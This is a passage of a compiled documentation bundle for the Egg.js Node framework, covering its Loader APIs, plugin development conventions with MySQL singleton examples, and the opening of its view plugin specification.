`,paraId:57,tocIndex:8},{value:"It's convenient for development team to customize loading via the Loader supported APIs. such as ",paraId:58,tocIndex:8},{value:"this.model.xx",paraId:58,tocIndex:8},{value:", ",paraId:58,tocIndex:8},{value:"app/extend/filter.js",paraId:58,tocIndex:8},{value:" and so on.",paraId:58,tocIndex:8},{value:"The mention above is just a description of the Loader wording, please see ",paraId:59,tocIndex:8},{value:"Framework Development",paraId:60,tocIndex:8},{value:" for details.",paraId:59,tocIndex:8},{value:"Loader also supports some low level APIs to simplify code when extending, ",paraId:61,tocIndex:9},{value:"here",paraId:61,tocIndex:9},{value:" are all APIs.",paraId:61,tocIndex:9},{value:"loadFile",paraId:43},{value:"Used to load a file, such as loading ",paraId:62,tocIndex:10},{value:"app/xx.js",paraId:62,tocIndex:10},{value:":",paraId:62,tocIndex:10},{value:`// app/xx.js
module.exports = (app) => {
  console.log(app.config);
};

// app.js
// app/xx.js, as an example, we could load this file in app.js
const path = require('path');
module.exports = (app) => {
  app.loader.loadFile(path.join(app.config.baseDir, 'app/xx.js'));
};
`,paraId:63,tocIndex:10},{value:"If the file exports a function, then the function will be called with ",paraId:64,tocIndex:10},{value:"app",paraId:64,tocIndex:10},{value:" as its parameter, otherwise uses this value directly.",paraId:64,tocIndex:10},{value:"loadToApp",paraId:43},{value:"Used to load files from a directory into the app, such as ",paraId:65,tocIndex:11},{value:"app/controller/home.js",paraId:65,tocIndex:11},{value:" to ",paraId:65,tocIndex:11},{value:"app.controller.home",paraId:65,tocIndex:11},{value:".",paraId:65,tocIndex:11},{value:`// app.js
// The following is just an example, using loadController to load controller in practice
module.exports = (app) => {
  const directory = path.join(app.config.baseDir, 'app/controller');
  app.loader.loadToApp(directory, 'controller');
};
`,paraId:66,tocIndex:11},{value:"The method has three parameters ",paraId:67,tocIndex:11},{value:"loadToApp(directory, property, LoaderOptions)",paraId:67,tocIndex:11},{value:":",paraId:67,tocIndex:11},{value:"Directory could be String or Array, Loader will load files in those directories.",paraId:68,tocIndex:11},{value:"Property is app's property.",paraId:68,tocIndex:11},{value:"LoaderOptions",paraId:69,tocIndex:11},{value:" are some configurations.",paraId:68,tocIndex:11},{value:"loadToContext",paraId:43},{value:"The difference between loadToApp and loadToContext is that loadToContext loads files into ctx instead of app, and it's a lazy loading. It puts files into a temp object when loading, and instantiates objects when calling ctx APIs.",paraId:70,tocIndex:12},{value:"We load service in this mode as an example:",paraId:71,tocIndex:12},{value:`// The following is just an example, using loadService in practice
// app/service/user.js
const Service = require('egg').Service;
class UserService extends Service {}
module.exports = UserService;

// app.js
// get all loadUnit
const servicePaths = app.loader
  .getLoadUnits()
  .map((unit) => path.join(unit.path, 'app/service'));

app.loader.loadToContext(servicePaths, 'service', {
  // service needs to inherit app.Service, so needs app as parameter
  // enable call will return UserService when loading
  call: true,
  // loading file into app.serviceClasses
  fieldClass: 'serviceClasses',
});
`,paraId:72,tocIndex:12},{value:"app.serviceClasses.user",paraId:73,tocIndex:12},{value:" becomes UserService after file loading, it instantiates UserService when calling ",paraId:73,tocIndex:12},{value:"ctx.service.user",paraId:73,tocIndex:12},{value:`.
So this class will only be instantiated when first calling, and will be cached after instantiation, multiple calling same request will be instantiated only once.`,paraId:73,tocIndex:12},{value:"ignore [String]",paraId:43},{value:"ignore",paraId:74,tocIndex:14},{value:" could ignore some files, supports glob, the default is empty.",paraId:74,tocIndex:14},{value:`app.loader.loadToApp(directory, 'controller', {
  // ignore files in app/controller/util
  ignore: 'util/**',
});
`,paraId:75,tocIndex:14},{value:"initializer [Function]",paraId:43},{value:"Processing each file exported values, the default is empty.",paraId:76,tocIndex:15},{value:`// app/model/user.js
module.exports = class User {
  constructor(app, path) {}
};

// Loading from app/model, could do some initializations when loading.
const directory = path.join(app.config.baseDir, 'app/model');
app.loader.loadToApp(directory, 'model', {
  initializer(model, opt) {
    // The first parameter is export's object
    // The second parameter is an object that only contains current file path.
    return new model(app, opt.path);
  },
});
`,paraId:77,tocIndex:15},{value:"caseStyle [String]",paraId:43},{value:"File conversion rules, could be ",paraId:78,tocIndex:16},{value:"camel",paraId:78,tocIndex:16},{value:", ",paraId:78,tocIndex:16},{value:"upper",paraId:78,tocIndex:16},{value:", ",paraId:78,tocIndex:16},{value:"lower",paraId:78,tocIndex:16},{value:", the default is ",paraId:78,tocIndex:16},{value:"camel",paraId:78,tocIndex:16},{value:".",paraId:78,tocIndex:16},{value:"All three convert file name to camel case, but deal with the initials differently:",paraId:79,tocIndex:16},{value:"camel",paraId:80,tocIndex:16},{value:": initials unchanged.",paraId:80,tocIndex:16},{value:"upper",paraId:80,tocIndex:16},{value:": initials upper case.",paraId:80,tocIndex:16},{value:"lower",paraId:80,tocIndex:16},{value:": initials lower case.",paraId:80,tocIndex:16},{value:"Loading different files uses different configurations:",paraId:81,tocIndex:16},{value:"File",paraId:82,tocIndex:16},{value:"Configuration",paraId:82,tocIndex:16},{value:"app/controller",paraId:82,tocIndex:16},{value:"lower",paraId:82,tocIndex:16},{value:"app/middleware",paraId:82,tocIndex:16},{value:"lower",paraId:82,tocIndex:16},{value:"app/service",paraId:82,tocIndex:16},{value:"lower",paraId:82,tocIndex:16},{value:"override [Boolean]",paraId:43},{value:"Overriding or throwing exception when encounter existing files, the default is false.",paraId:83,tocIndex:17},{value:"For example, the ",paraId:84,tocIndex:17},{value:"app/service/user.js",paraId:84,tocIndex:17},{value:" is both loaded by the application and the plugin, if the setting is true, the application will override the plugin, otherwise an error will be throwed when loading.",paraId:84,tocIndex:17},{value:"Loading different files uses different configurations:",paraId:85,tocIndex:17},{value:"File",paraId:86,tocIndex:17},{value:"Configuration",paraId:86,tocIndex:17},{value:"app/controller",paraId:86,tocIndex:17},{value:"true",paraId:86,tocIndex:17},{value:"app/middleware",paraId:86,tocIndex:17},{value:"false",paraId:86,tocIndex:17},{value:"app/service",paraId:86,tocIndex:17},{value:"false",paraId:86,tocIndex:17},{value:"call [Boolean]",paraId:43},{value:"Calling when export's object is function, and get the return value, the default is true",paraId:87,tocIndex:18},{value:"Loading different files uses different configurations:",paraId:88,tocIndex:18},{value:"File",paraId:89,tocIndex:18},{value:"Configuration",paraId:89,tocIndex:18},{value:"app/controller",paraId:89,tocIndex:18},{value:"true",paraId:89,tocIndex:18},{value:"app/middleware",paraId:89,tocIndex:18},{value:"false",paraId:89,tocIndex:18},{value:"app/service",paraId:89,tocIndex:18},{value:"true",paraId:89,tocIndex:18},{value:"You can use ",paraId:90,tocIndex:19},{value:"customLoader",paraId:90,tocIndex:19},{value:" instead of ",paraId:90,tocIndex:19},{value:"loadToContext",paraId:90,tocIndex:19},{value:" and ",paraId:90,tocIndex:19},{value:"loadToApp",paraId:90,tocIndex:19},{value:".",paraId:90,tocIndex:19},{value:"When you define a loader with ",paraId:91,tocIndex:19},{value:"loadToApp",paraId:91,tocIndex:19},{value:`// app.js
module.exports = (app) => {
  const directory = path.join(app.config.baseDir, 'app/adapter');
  app.loader.loadToApp(directory, 'adapter');
};
`,paraId:92,tocIndex:19},{value:"Instead, you can define ",paraId:93,tocIndex:19},{value:"customLoader",paraId:93,tocIndex:19},{value:`// config/config.default.js
module.exports = {
  customLoader: {
    // the property name when load to application, E.X. app.adapter
    adapter: {
      // relative to app.config.baseDir
      directory: 'app/adapter',
      // if inject is ctx, it will use loadToContext
      inject: 'app',
      // whether load the directory of the framework and plugin
      loadunit: false,
      // you can also use other LoaderOptions
   }
  },
};
`,paraId:94,tocIndex:19},{value:"Loader",paraId:95,tocIndex:20},{value:"AppWorkerLoader",paraId:95,tocIndex:20},{value:"AgentWorkerLoader",paraId:95,tocIndex:20}]},64294:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(16016);const t=[{value:"Plugins are the most important features in Egg framework. They keep Egg simple, stable and efficient, and also they make the best reuse of business logic to build an entire ecosystem. Maybe we want to ask:",paraId:0},{value:"Since Koa already has the mechanism of middleware, Why do we need plugins?",paraId:1},{value:"What are the differences / relationships among middlewares, plugins and applications?",paraId:1},{value:"How can I use the plugin?",paraId:1},{value:"How do I build a plugin?",paraId:1},{value:"...",paraId:1},{value:"As we've already explained some these points in chapter ",paraId:2},{value:"using plugins",paraId:3},{value:" before. Now we are going through how to build a plugin.",paraId:2},{value:"Just use ",paraId:4,tocIndex:1},{value:"egg-boilerplate-plugin",paraId:4,tocIndex:1},{value:" to generates a scaffold for you.",paraId:4,tocIndex:1},{value:`$ mkdir egg-hello && cd egg-hello
$ npm init egg --type=plugin
$ npm i
$ npm test
`,paraId:5,tocIndex:1},{value:"Plugin is actually a ",paraId:6,tocIndex:2},{value:"mini application",paraId:6,tocIndex:2},{value:", directory of plugin is as below:",paraId:6,tocIndex:2},{value:`. egg-hello
\u251C\u2500\u2500 package.json
\u251C\u2500\u2500 app.js (optional)
\u251C\u2500\u2500 agent.js (optional)
\u251C\u2500\u2500 app
\u2502   \u251C\u2500\u2500 extend (optional)
\u2502   |   \u251C\u2500\u2500 helper.js (optional)
\u2502   |   \u251C\u2500\u2500 request.js (optional)
\u2502   |   \u251C\u2500\u2500 response.js (optional)
\u2502   |   \u251C\u2500\u2500 context.js (optional)
\u2502   |   \u251C\u2500\u2500 application.js (optional)
\u2502   |   \u2514\u2500\u2500 agent.js (optional)
\u2502   \u251C\u2500\u2500 service (optional)
\u2502   \u2514\u2500\u2500 middleware (optional)
\u2502       \u2514\u2500\u2500 mw.js
\u251C\u2500\u2500 config
|   \u251C\u2500\u2500 config.default.js
\u2502   \u251C\u2500\u2500 config.prod.js
|   \u251C\u2500\u2500 config.test.js (optional)
|   \u251C\u2500\u2500 config.local.js (optional)
|   \u2514\u2500\u2500 config.unittest.js (optional)
\u2514\u2500\u2500 test
    \u2514\u2500\u2500 middleware
        \u2514\u2500\u2500 mw.test.js
`,paraId:7,tocIndex:2},{value:"It is almost the same as the application directory, what're the differences?",paraId:8,tocIndex:2},{value:"Plugin have no independant router or controller. This is because:",paraId:9,tocIndex:2},{value:"Usually routers are strongly bound to application, it is not fit here.",paraId:10,tocIndex:2},{value:"An application might have plenty of dependant plugins, routers of plugin are very possible conflict with others. It would be a disaster.",paraId:10,tocIndex:2},{value:"If you really need a general router, you should implement it as middleware of the plugin.",paraId:10,tocIndex:2},{value:"The specific information of plugin should be declared in the ",paraId:11,tocIndex:2},{value:"package.json",paraId:11,tocIndex:2},{value:" of ",paraId:11,tocIndex:2},{value:"eggPlugin",paraId:11,tocIndex:2},{value:"\uFF1A",paraId:11,tocIndex:2},{value:"{String} name",paraId:12,tocIndex:2},{value:" - plugin name(required), it must be unique, it will be used in the config of the dependencies of plugins.",paraId:12,tocIndex:2},{value:"{Array} dependencies",paraId:13,tocIndex:2},{value:" - strong dependent plugins list of the current plugin(if one of these plugins here is not found, application's startup will fail).",paraId:13,tocIndex:2},{value:"{Array} optionalDependencies",paraId:14,tocIndex:2},{value:" - optional dependencies list of this plugin.(if these plugins are not activated, only warnings would be occurred, and will not affect the startup of the application).",paraId:14,tocIndex:2},{value:"{Array} env",paraId:15,tocIndex:2},{value:" - this option is available only when specifying the environment. For the list of env, please refer to ",paraId:15,tocIndex:2},{value:"env",paraId:16,tocIndex:2},{value:". This is optional, most time you can leave it.",paraId:15,tocIndex:2},{value:`{
  "name": "egg-rpc",
  "eggPlugin": {
    "name": "rpc",
    "dependencies": ["registry"],
    "optionalDependencies": ["vip"],
    "env": ["local", "test", "unittest", "prod"]
  }
}
`,paraId:17,tocIndex:2},{value:"No ",paraId:18,tocIndex:2},{value:"plugin.js",paraId:18,tocIndex:2},{value:"\uFF1A",paraId:18,tocIndex:2},{value:"eggPlugin.dependencies",paraId:19,tocIndex:2},{value:" is for declaring dependencies only, not for importing, nor activating.",paraId:19,tocIndex:2},{value:"If you want to manage multiple plugins, you should do it in",paraId:19,tocIndex:2},{value:"upper framework",paraId:20,tocIndex:2},{value:"The dependencies are managed by plugin himself, which is different from middlewares. Before loading plugins, application will read ",paraId:21,tocIndex:3},{value:"eggPlugin > dependencies",paraId:21,tocIndex:3},{value:" and ",paraId:21,tocIndex:3},{value:"eggPlugin > optionalDependencies",paraId:21,tocIndex:3},{value:" from ",paraId:21,tocIndex:3},{value:"package.json",paraId:21,tocIndex:3},{value:", and then sort out the loading orders according to their relationships, for example, the loading order of the following plugins is ",paraId:21,tocIndex:3},{value:"c => b => a",paraId:21,tocIndex:3},{value:":",paraId:21,tocIndex:3},{value:`// plugin a
{
  "name": "egg-plugin-a",
  "eggPlugin": {
    "name": "a",
    "dependencies": [ "b" ]
  }
}

// plugin b
{
  "name": "egg-plugin-b",
  "eggPlugin": {
    "name": "b",
    "optionalDependencies": [ "c" ]
  }
}

// plugin c
{
  "name": "egg-plugin-c",
  "eggPlugin": {
    "name": "c"
  }
}
`,paraId:22,tocIndex:3},{value:"Attention: The values in ",paraId:23,tocIndex:3},{value:"dependencies",paraId:23,tocIndex:3},{value:" and ",paraId:23,tocIndex:3},{value:"optionalDependencies",paraId:23,tocIndex:3},{value:" are the ",paraId:23,tocIndex:3},{value:"eggPlugin.name",paraId:23,tocIndex:3},{value:" of plugins, not ",paraId:23,tocIndex:3},{value:"package.name",paraId:23,tocIndex:3},{value:".",paraId:23,tocIndex:3},{value:"The ",paraId:24,tocIndex:3},{value:"dependencies",paraId:24,tocIndex:3},{value:" and ",paraId:24,tocIndex:3},{value:"optionalDependencies",paraId:24,tocIndex:3},{value:" are learnt from ",paraId:24,tocIndex:3},{value:"npm",paraId:24,tocIndex:3},{value:", most time we use ",paraId:24,tocIndex:3},{value:"dependencies",paraId:24,tocIndex:3},{value:", which is recommended. There are about two situations to apply the ",paraId:24,tocIndex:3},{value:"optionalDependencies",paraId:24,tocIndex:3},{value:":",paraId:24,tocIndex:3},{value:"Only be dependant in specific environment: for example, an authentication plugin, only depends on the mock plugin in development environment.",paraId:25,tocIndex:3},{value:"Weakly depending, for example: A depends on B, but without B, A can take other choices.",paraId:25,tocIndex:3},{value:"Attention: if you are using ",paraId:26,tocIndex:3},{value:"optionalDependencies",paraId:26,tocIndex:3},{value:", framework won't verify the activation of these dependencies, they are only for sorting loading orders. In such situation, the plugin will go through other ways such as ",paraId:26,tocIndex:3},{value:"interface detection",paraId:26,tocIndex:3},{value:" to decide processing logic.",paraId:26,tocIndex:3},{value:"We've discussed what plugin is. Now what can it do?",paraId:27,tocIndex:4},{value:"Extend the built-in objects of the framework, just like the application",paraId:28,tocIndex:5},{value:"app/extend/request.js",paraId:29,tocIndex:5},{value:" - extends Koa#Request object",paraId:29,tocIndex:5},{value:"app/extend/response.js",paraId:29,tocIndex:5},{value:" - extends Koa#Response object",paraId:29,tocIndex:5},{value:"app/extend/context.js",paraId:29,tocIndex:5},{value:" - extends Koa#Context object",paraId:29,tocIndex:5},{value:"app/extend/helper.js ",paraId:29,tocIndex:5},{value:" - extends Helper object",paraId:29,tocIndex:5},{value:"app/extend/application.js",paraId:29,tocIndex:5},{value:" - extends Application object",paraId:29,tocIndex:5},{value:"app/extend/agent.js",paraId:29,tocIndex:5},{value:" - extends Agent object",paraId:29,tocIndex:5},{value:"First, define and implement middleware under directory ",paraId:30,tocIndex:6},{value:"app/middleware",paraId:30,tocIndex:6},{value:":",paraId:30,tocIndex:6},{value:`'use strict';

const staticCache = require('koa-static-cache');
const assert = require('assert');
const mkdirp = require('mkdirp');

module.exports = (options, app) => {
  assert.strictEqual(
    typeof options.dir,
    'string',
    'Must set \`app.config.static.dir\` when static plugin enable',
  );

  // ensure directory exists
  mkdirp.sync(options.dir);

  app.loggers.coreLogger.info(
    '[egg-static] starting static serve %s -> %s',
    options.prefix,
    options.dir,
  );

  return staticCache(options);
};
`,paraId:31,tocIndex:6},{value:"Insert middleware to the appropriate position in ",paraId:32,tocIndex:6},{value:"app.js",paraId:32,tocIndex:6},{value:"(e.g. insert static middleware before bodyParser):",paraId:32,tocIndex:6},{value:`const assert = require('assert');

module.exports = (app) => {
  // insert static middleware before bodyParser
  const index = app.config.coreMiddleware.indexOf('bodyParser');
  assert(index >= 0, 'bodyParser highly needed');

  app.config.coreMiddleware.splice(index, 0, 'static');
};
`,paraId:33,tocIndex:6},{value:"If you want to read some local config before startup:",paraId:34,tocIndex:7},{value:`// \${plugin_root}/app.js
const fs = require('fs');
const path = require('path');

module.exports = (app) => {
  app.customData = fs.readFileSync(path.join(app.config.baseDir, 'data.bin'));

  app.coreLogger.info('read data ok');
};
`,paraId:35,tocIndex:7},{value:"If you want to do some async starting business, you can do it with ",paraId:36,tocIndex:7},{value:"app.beforeStart",paraId:36,tocIndex:7},{value:" API:",paraId:36,tocIndex:7},{value:`// \${plugin_root}/app.js
const MyClient = require('my-client');

module.exports = (app) => {
  app.myClient = new MyClient();
  app.myClient.on('error', (err) => {
    app.coreLogger.error(err);
  });
  app.beforeStart(async () => {
    await app.myClient.ready();
    app.coreLogger.info('my client is ready');
  });
};
`,paraId:37,tocIndex:7},{value:"You can add initialization business of agent with ",paraId:38,tocIndex:7},{value:"agent.beforeStart",paraId:38,tocIndex:7},{value:" API:",paraId:38,tocIndex:7},{value:`// \${plugin_root}/agent.js
const MyClient = require('my-client');

module.exports = (agent) => {
  agent.myClient = new MyClient();
  agent.myClient.on('error', (err) => {
    agent.coreLogger.error(err);
  });
  agent.beforeStart(async () => {
    await agent.myClient.ready();
    agent.coreLogger.info('my client is ready');
  });
};
`,paraId:39,tocIndex:7},{value:"Setup dependencies of schedule plugin in ",paraId:40,tocIndex:8},{value:"package.json",paraId:40,tocIndex:8},{value:":",paraId:40,tocIndex:8},{value:`{
  "name": "your-plugin",
  "eggPlugin": {
    "name": "your-plugin",
    "dependencies": ["schedule"]
  }
}
`,paraId:41,tocIndex:8},{value:"Create a new file in ",paraId:42,tocIndex:8},{value:"${plugin_root}/app/schedule/",paraId:42,tocIndex:8},{value:" directory to edit your schedule task:",paraId:42,tocIndex:8},{value:`exports.schedule = {
  type: 'worker',
  cron: '0 0 3 * * *',
  // interval: '1h',
  // immediate: true,
};

exports.task = async (ctx) => {
  // your logic code
};
`,paraId:43,tocIndex:8},{value:"Some plugins are made to introduce existing service into framework, like ",paraId:44,tocIndex:9},{value:"egg-mysql",paraId:44,tocIndex:9},{value:", ",paraId:44,tocIndex:9},{value:"egg-oss",paraId:44,tocIndex:9},{value:".They all need to create corresponding instances in applications. We notice that there are some common problems when developing plugins of this kind:",paraId:44,tocIndex:9},{value:"Use different instances of the same service in one application (e.g: connect to two different MySQL databases).",paraId:45,tocIndex:9},{value:"Dynamically initialize connection after getting config from other service (e.g: get the MySQL server address from configuration center and then create connection).",paraId:45,tocIndex:9},{value:"If each plugin makes their own implementation, all sorts of configs and initializations will be chaotic. So the framework supplies the ",paraId:46,tocIndex:9},{value:"app.addSingleton(name, creator)",paraId:46,tocIndex:9},{value:" API to unify the creation of this kind of services. Note that while using the ",paraId:46,tocIndex:9},{value:"app.addSingleton(name, creator)",paraId:46,tocIndex:9},{value:" method, the configuration file must have the ",paraId:46,tocIndex:9},{value:"client",paraId:46,tocIndex:9},{value:" or ",paraId:46,tocIndex:9},{value:"clients",paraId:46,tocIndex:9},{value:" key configuration as the ",paraId:46,tocIndex:9},{value:"config",paraId:46,tocIndex:9},{value:" to the ",paraId:46,tocIndex:9},{value:"creator",paraId:46,tocIndex:9},{value:" function.",paraId:46,tocIndex:9},{value:"We simplify the ",paraId:47,tocIndex:10},{value:"egg-mysql",paraId:47,tocIndex:10},{value:" plugin to see how to write it:",paraId:47,tocIndex:10},{value:`// egg-mysql/app.js
module.exports = (app) => {
  // The first parameter mysql defines the field  mounted to app, we can access MySQL singleton instance via \`app.mysql\`
  // The second parameter createMysql accepts two parameters (config, app), and then returns a MySQL instance
  app.addSingleton('mysql', createMysql);
};

/**
 * @param  {Object} config   The config is processed by the framework. If the application is configured with multiple MySQL instances, each config would be passed in and call multiple createMysql
 * @param  {Application} app  the current application
 * @return {Object}          return the created MySQL instance
 */
function createMysql(config, app) {
  assert(config.host && config.port && config.user && config.database);
  // create instance
  const client = new Mysql(config);

  // check before start the application
  app.beforeStart(async () => {
    const rows = await client.query('select now() as currentTime;');
    app.coreLogger.info(
      \`[egg-mysql] init instance success, rds currentTime: \${rows[0].currentTime}\`,
    );
  });

  return client;
}
`,paraId:48,tocIndex:10},{value:"The initialization function also supports ",paraId:49,tocIndex:10},{value:"Async function",paraId:49,tocIndex:10},{value:", convenient for some special plugins that need to be asynchronous to get some configuration files.",paraId:49,tocIndex:10},{value:`async function createMysql(config, app) {
  // get mysql configurations asynchronous
  const mysqlConfig = await app.configManager.getMysqlConfig(config.mysql);
  assert(
    mysqlConfig.host &&
      mysqlConfig.port &&
      mysqlConfig.user &&
      mysqlConfig.database,
  );
  // create instance
  const client = new Mysql(mysqlConfig);

  // check before start the application
  const rows = await client.query('select now() as currentTime;');
  app.coreLogger.info(
    \`[egg-mysql] init instance success, rds currentTime: \${rows[0].currentTime}\`,
  );

  return client;
}
`,paraId:50,tocIndex:10},{value:"As you can see, all we need to do for this plugin is passing the fields that need to be mounted and the corresponding initialization function. Framework will be in charge of managing all the configs and the ways to access the instances.",paraId:51,tocIndex:10},{value:"Declare MySQL config in config file:",paraId:52,tocIndex:12},{value:`// config/config.default.js
module.exports = {
  mysql: {
    client: {
      host: 'mysql.com',
      port: '3306',
      user: 'test_user',
      password: 'test_password',
      database: 'test',
    },
  },
};
`,paraId:53,tocIndex:12},{value:"Access database through ",paraId:54,tocIndex:12},{value:"app.mysql",paraId:54,tocIndex:12},{value:" directly:",paraId:54,tocIndex:12},{value:`// app/controller/post.js
class PostController extends Controller {
  async list() {
    const posts = await this.app.mysql.query(sql, values);
  },
}
`,paraId:55,tocIndex:12},{value:"We need to configure MySQL in the config file, but different from single instance, we need to add ",paraId:56,tocIndex:13},{value:"clients",paraId:56,tocIndex:13},{value:" in the config to declare the configuration of different instances. Meanwhile, the ",paraId:56,tocIndex:13},{value:"default",paraId:56,tocIndex:13},{value:" field can be used to configure the shared configuration in multiple instances (e.g: ",paraId:56,tocIndex:13},{value:"host",paraId:56,tocIndex:13},{value:" and ",paraId:56,tocIndex:13},{value:"port",paraId:56,tocIndex:13},{value:"). In this case, we should use ",paraId:56,tocIndex:13},{value:"get",paraId:56,tocIndex:13},{value:" function to specify the corresponding instance(e.g: use ",paraId:56,tocIndex:13},{value:"app.mysql.get('db1').query()",paraId:56,tocIndex:13},{value:" instead of using ",paraId:56,tocIndex:13},{value:"app.mysql.query()",paraId:56,tocIndex:13},{value:" directly to get an ",paraId:56,tocIndex:13},{value:"undefined",paraId:56,tocIndex:13},{value:").",paraId:56,tocIndex:13},{value:`// config/config.default.js
exports.mysql = {
  clients: {
    // clientId, access the client instance by app.mysql.get('clientId')
    db1: {
      user: 'user1',
      password: 'upassword1',
      database: 'db1',
    },
    db2: {
      user: 'user2',
      password: 'upassword2',
      database: 'db2',
    },
  },
  // default configuration for all databases
  default: {
    host: 'mysql.com',
    port: '3306',
  },
};
`,paraId:57,tocIndex:13},{value:"Access the corresponding instance by ",paraId:58,tocIndex:13},{value:"app.mysql.get('db1')",paraId:58,tocIndex:13},{value:":",paraId:58,tocIndex:13},{value:`// app/controller/post.js
class PostController extends Controller {
  async list() {
    const posts = await this.app.mysql.get('db1').query(sql, values);
  },
}
`,paraId:59,tocIndex:13},{value:"Instead of declaring the configuration in the configuration file in advance, we can dynamically initialize an instance at the runtime of the application.",paraId:60,tocIndex:14},{value:`// app.js
module.exports = (app) => {
  app.beforeStart(async () => {
    //  get MySQL config from configuration center { host, post, password, ... }
    const mysqlConfig = await app.configCenter.fetch('mysql');
    // create MySQL instance dynamically
    app.database = app.mysql.createInstanceAsync(mysqlConfig);
  });
};
`,paraId:61,tocIndex:14},{value:"Access the instance through ",paraId:62,tocIndex:14},{value:"app.database",paraId:62,tocIndex:14},{value:`// app/controller/post.js
class PostController extends Controller {
  async list() {
    const posts = await this.app.database.query(sql, values);
  },
}
`,paraId:63,tocIndex:14},{value:"Attention: when creating the instance dynamically, framework would read the ",paraId:64,tocIndex:14},{value:"default",paraId:64,tocIndex:14},{value:" configuration from the config file as the default.",paraId:64,tocIndex:14},{value:"When loading the plugins in the framework, it will follow the rules below:",paraId:65,tocIndex:15},{value:"If there is the path configuration, load them in path directly.",paraId:66,tocIndex:15},{value:"If there is no path configuration, search them with the package name, the search orders are:",paraId:67,tocIndex:15},{value:"node_modules",paraId:68,tocIndex:15},{value:" directory of the application root",paraId:68,tocIndex:15},{value:"node_modules",paraId:68,tocIndex:15},{value:" directory of the dependencies",paraId:68,tocIndex:15},{value:"node_modules",paraId:68,tocIndex:15},{value:" of current directory(generally for unit test compatibility)",paraId:68,tocIndex:15},{value:"It's well welcomed to your contributions to the new plugins, but also hope you follow some of following specifications:",paraId:69,tocIndex:16},{value:"Naming Rules:",paraId:70,tocIndex:16},{value:"npm",paraId:71,tocIndex:16},{value:" packages must append prefix ",paraId:71,tocIndex:16},{value:"egg-",paraId:71,tocIndex:16},{value:",and all letters must be lowercase, e.g: ",paraId:71,tocIndex:16},{value:"egg-xxx",paraId:71,tocIndex:16},{value:". The long names should be concatenated with middle-lines: ",paraId:71,tocIndex:16},{value:"egg-foo-bar",paraId:71,tocIndex:16},{value:".",paraId:71,tocIndex:16},{value:"The corresponding plugin should be named in camel-case. The name should be translated according to the middle-lines of the ",paraId:71,tocIndex:16},{value:"npm",paraId:71,tocIndex:16},{value:" name:",paraId:71,tocIndex:16},{value:"egg-foo-bar",paraId:71,tocIndex:16},{value:" => ",paraId:71,tocIndex:16},{value:"fooBar",paraId:71,tocIndex:16},{value:".",paraId:71,tocIndex:16},{value:"The use of middle-lines is not compulsive, e.g: userservice(egg-userservice) and user-service(egg-user-service) are both acceptable.",paraId:71,tocIndex:16},{value:"package.json",paraId:72,tocIndex:16},{value:" Rules:",paraId:72,tocIndex:16},{value:"Add ",paraId:73,tocIndex:16},{value:"eggPlugin",paraId:73,tocIndex:16},{value:" property according to the details discussed before.",paraId:73,tocIndex:16},{value:"For convenient index, add ",paraId:74,tocIndex:16},{value:"egg",paraId:74,tocIndex:16},{value:",",paraId:74,tocIndex:16},{value:"egg-plugin",paraId:74,tocIndex:16},{value:",",paraId:74,tocIndex:16},{value:"eggPlugin",paraId:74,tocIndex:16},{value:" in ",paraId:74,tocIndex:16},{value:"keywords",paraId:74,tocIndex:16},{value:":",paraId:74,tocIndex:16},{value:`{
  "name": "egg-view-nunjucks",
  "version": "1.0.0",
  "description": "view plugin for egg",
  "eggPlugin": {
    "name": "nunjucks",
    "dep": ["security"]
  },
  "keywords": [
    "egg",
    "egg-plugin",
    "eggPlugin",
    "egg-plugin-view",
    "egg-view",
    "nunjucks"
  ]
}
`,paraId:75,tocIndex:16},{value:"npm",paraId:76},{value:"Egg defines the plugin name through the ",paraId:77,tocIndex:17},{value:"eggPlugin.name",paraId:77,tocIndex:17},{value:", it is only unique in application or framework, that means ",paraId:77,tocIndex:17},{value:"many npm packages might get the same plugin name",paraId:77,tocIndex:17},{value:", why design in this way?",paraId:77,tocIndex:17},{value:"First, Egg plugin does not only support npm packages, but also supports plugins-searching in local directory. In Chapter ",paraId:78,tocIndex:17},{value:"progressive",paraId:79,tocIndex:17},{value:" we've mentioned how to make progress by using these two configurations. Directories are more friendly to unit tests. So, Egg can not ensure uniqueness through npm package names.",paraId:78,tocIndex:17},{value:"What's more, Egg can use this feature to make an adapter, for example, the plugin defined in",paraId:80,tocIndex:17},{value:"Template Develop Spec",paraId:81,tocIndex:17},{value:" was named as view, but there are plugins named ",paraId:80,tocIndex:17},{value:"egg-view-nunjucks",paraId:80,tocIndex:17},{value:" and ",paraId:80,tocIndex:17},{value:"egg-view-react",paraId:80,tocIndex:17},{value:", the users only need to change the plugin and modify the templates, no need to modify the controllers, because all these plugins have implemented the same APIs.",paraId:80,tocIndex:17},{value:"Giving the same plugin name and the same API to the same plugin can make quick switch between them",paraId:82,tocIndex:17},{value:". This is really really useful in template and database.",paraId:82,tocIndex:17}]},5014:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(48930);const t=[{value:"In most cases, we need to read the data, render the template and then present it to the user. The framework does not force to use one template engine, but allows developers to select the ",paraId:0},{value:"template",paraId:1},{value:" by themselves. For details, see ",paraId:0},{value:"Template Rendering",paraId:2},{value:".",paraId:0},{value:"This article describes the framework's specification constraints on the View plugin, and we can use this to encapsulate the corresponding template engine plugin. The following takes ",paraId:3},{value:"egg-view-ejs",paraId:3},{value:" as an example.",paraId:3},{value:`egg-view-ejs
\u251C\u2500\u2500 config
\u2502 \u251C\u2500\u2500 config.default.js
\u2502 \u2514\u2500\u2500 config.local.js
\u251C\u2500\u2500 lib
\u2502 \u2514\u2500\u2500 view.js
\u251C\u2500\u2500 app.js
\u251C\u2500\u2500 test
\u251C\u2500\u2500 History.md
\u251C\u2500\u2500 README.md
\u2514\u2500\u2500 package.json
`,paraId:4,tocIndex:0},{value:"Follow the ",paraId:5,tocIndex:1},{value:"plugin development specification",paraId:6,tocIndex:1},{value:"According to the convention, the names of plugins start with ",paraId:5,tocIndex:1},{value:"egg-view-",paraId:5,tocIndex:1},{value:"package.json",paraId:5,tocIndex:1},{value:" is configured as follows. Plugins are named after the template engine, such as ejs",paraId:5,tocIndex:1},{value:`{
  "name": "egg-view-ejs",
  "eggPlugin": {
    "name": "ejs"
  },
  "keywords": ["egg", "egg-plugin", "egg-view", "ejs"]
}
`,paraId:7,tocIndex:1},{value:"The configuration item is also named after the template engine",paraId:8,tocIndex:1},{value:`// config/config.default.js
module.exports = {
  ejs: {},
};
